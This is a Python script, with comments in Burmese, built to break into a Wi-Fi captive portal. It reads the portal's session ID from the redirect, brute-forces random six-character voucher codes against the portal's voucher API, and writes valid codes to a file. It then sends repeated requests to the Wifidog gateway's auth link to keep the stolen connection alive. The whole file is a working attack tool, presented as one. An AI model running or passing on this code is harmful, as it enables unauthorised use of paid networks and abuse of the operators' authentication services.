import requests
import re
import urllib3
import time
import threading
import random
import string
from urllib.parse import urlparse, parse_qs

# Warning များကို ပိတ်ထားခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- SETTINGS ---
THREADS = 5
PING_INTERVAL = 0.1
TARGET_TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

def generate_voucher(length=6):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def high_speed_ping(auth_link, session, sid):
    """အင်တာနက် အဆက်မပြတ်ရစေရန် Auth Link ကို Ping ထိုးပေးခြင်း"""
    print(f"\n[+] Turbo Ping Started for SID: {sid}")
    while True:
        try:
            session.get(auth_link, timeout=5)
            # အင်တာနက်တကယ်ရမရ စစ်ဆေးခြင်း
            if check_real_internet():
                print(f"[{time.strftime('%H:%M:%S')}] Status: CONNECTED (Online)     ", end='\r')
            else:
                print(f"[{time.strftime('%H:%M:%S')}] Status: PINGING (Wait...)      ", end='\r')
        except:
            break
        time.sleep(PING_INTERVAL)

def start_attack():
    print(f"[*] Starting Combined Starlink & Redirect Script...")
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Android 10; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0"
    })

    try:
        # ၁။ Portal Redirect ကို ရှာဖွေပြီး Session ID (sid) နှိုက်ယူခြင်း
        r = session.get(TARGET_TEST_URL, allow_redirects=True, timeout=5)
        portal_url = r.url
        parsed_portal = urlparse(portal_url)
        portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
        
        # URL parameters မှ sid ကို ရှာခြင်း
        params = parse_qs(parsed_portal.query)
        sid = params.get('sid', [None])[0] or params.get('token', [None])[0]

        if not sid:
            # HTML content ထဲတွင် sid ပါသလား ထပ်ရှာခြင်း
            sid_match = re.search(r'sid=(.*?)["\'&]', r.text)
            sid = sid_match.group(1) if sid_match else None

        if not sid:
            print("[!] Error: Could not find Session ID (sid).")
            return

        print(f"[+] Found Session ID: {sid}")
        print(f"[*] Target Portal: {portal_host}")

        # ၂။ Brute-force Voucher Loop
        print(f"[*] Brute-forcing Vouchers (Threads: {THREADS})...")
        
        found_voucher = None
        voucher_api = f"{portal_host}/api/auth/voucher/"

        while not found_voucher:
            v_code = generate_voucher()
            try:
                # 'accessCode' သို့မဟုတ် 'voucher' ဟု Portal ပေါ်မူတည်၍ ပြောင်းလဲနိုင်သည်
                v_res = session.post(voucher_api, json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                if v_res.status_code == 200 and "success" in v_res.text.lower():
                    print(f"\n{'-'*30}\n[!] SUCCESS: {v_code} is Valid!\n{'-'*30}")
                    found_voucher = v_code
                    with open("found_vouchers.txt", "a") as f:
                        f.write(f"{v_code} (SID: {sid})\n")
                else:
                    print(f"[-] Testing: {v_code} - Failed", end='\r')
            except:
                continue

        # ၃။ အောင်မြင်သွားပါက Wifidog Auth Link တည်ဆောက်ပြီး Ping ထိုးခြင်း
        gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
        gw_port = params.get('gw_port', ['2060'])[0]
        auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

        # Ping လုပ်ရန် thread အသစ်ဖွင့်ခြင်း
        for _ in range(THREADS):
            threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

        # Script မရပ်တန့်သွားစေရန် ထိန်းထားခြင်း
        while True:
            time.sleep(1)

    except Exception as e:
        print(f"\n[!] Connection Error: {e}")

if __name__ == "__main__":
    start_attack()
